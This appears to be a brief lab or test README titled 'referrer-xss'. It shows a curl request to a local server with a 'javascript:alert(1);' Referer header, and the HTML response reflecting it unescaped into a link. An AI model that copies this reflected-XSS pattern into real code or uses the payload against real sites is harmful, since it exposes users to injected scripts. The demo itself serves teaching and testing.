# referrer-xss

```
$ curl -s 'http://localhost:8080/' -H 'Referer: javascript:alert(1);'
<!DOCTYPE HTML>
<html>


<body>
    Link:
    <a href="javascript:alert(1);">back</a>
</body>

</html>
```
